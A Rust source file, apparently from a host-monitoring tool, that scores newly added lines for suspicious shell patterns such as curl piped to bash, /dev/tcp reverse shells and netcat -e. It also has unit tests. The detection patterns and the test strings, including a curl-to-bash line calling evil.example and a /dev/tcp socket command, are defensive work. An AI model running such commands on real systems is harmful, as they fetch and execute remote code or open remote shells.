use warden_common::event::Severity;

/// Scores one newly-added line for suspicious content. Best-effort and
/// deliberately looks for *combinations* rather than single keywords
/// (`curl` alone is extremely common in legitimate scripts; `curl` piped
/// straight into a shell is not) to keep the false-positive rate down on a
/// heuristic that will otherwise cry wolf on every second dotfile edit.
fn score_line(line: &str) -> Option<(Severity, &'static str)> {
    let l = line.to_lowercase();

    let fetches = l.contains("curl ") || l.contains("wget ");
    let pipes_to_shell = l.contains("| sh") || l.contains("|sh") || l.contains("| bash") || l.contains("|bash") || l.contains("| $shell");
    if fetches && pipes_to_shell {
        return Some((Severity::High, "downloads a remote script and pipes it directly into a shell"));
    }

    if l.contains("/dev/tcp/") || l.contains("/dev/udp/") {
        return Some((Severity::High, "bash TCP/UDP device pseudo-file, a common reverse-shell pattern"));
    }

    if l.contains("nc -e") || l.contains("ncat -e") || l.contains("nc.traditional -e") {
        return Some((Severity::High, "netcat with -e (binds a shell to a socket)"));
    }

    if l.contains("base64 -d") || l.contains("base64 --decode") || l.contains("base64 -di") {
        return Some((Severity::Medium, "decodes a base64 blob, a common obfuscation technique"));
    }

    if l.contains("chmod +x") || l.contains("chmod 777") || l.contains("chmod a+rwx") {
        return Some((Severity::Medium, "makes a file broadly executable"));
    }

    if mentions_suspicious_exec_path(&l) {
        return Some((Severity::High, "references an executable in a world-writable or hidden location"));
    }

    None
}

/// Locations nothing legitimate normally executes *from* on a workstation.
fn mentions_suspicious_exec_path(text: &str) -> bool {
    ["/tmp/", "/dev/shm/", "/var/tmp/", "/.cache/"].iter().any(|p| text.contains(p))
}

/// Scores a full set of newly-added lines, returning the worst severity
/// seen (or `None` if nothing matched any pattern) plus a human-readable
/// reason per match, for the notification/log detail.
pub fn score_added_lines(lines: &[String]) -> Option<(Severity, Vec<String>)> {
    let mut worst: Option<Severity> = None;
    let mut reasons = Vec::new();

    for line in lines {
        if let Some((sev, reason)) = score_line(line) {
            worst = Some(worst.map_or(sev, |w| w.max(sev)));
            reasons.push(format!("{reason}: {}", line.trim()));
        }
    }

    worst.map(|s| (s, reasons))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn flags_curl_pipe_shell() {
        let lines = vec!["curl http://evil.example/x | bash".to_string()];
        let (sev, reasons) = score_added_lines(&lines).expect("should flag");
        assert_eq!(sev, Severity::High);
        assert_eq!(reasons.len(), 1);
    }

    #[test]
    fn does_not_flag_bare_curl() {
        let lines = vec!["curl -O https://example.com/report.pdf".to_string()];
        assert!(score_added_lines(&lines).is_none());
    }

    #[test]
    fn flags_dev_tcp_reverse_shell() {
        let lines = vec!["exec 3<>/dev/tcp/10.0.0.1/4444".to_string()];
        let (sev, _) = score_added_lines(&lines).expect("should flag");
        assert_eq!(sev, Severity::High);
    }

    #[test]
    fn ordinary_alias_line_is_not_flagged() {
        let lines = vec!["alias ll='ls -la'".to_string()];
        assert!(score_added_lines(&lines).is_none());
    }
}
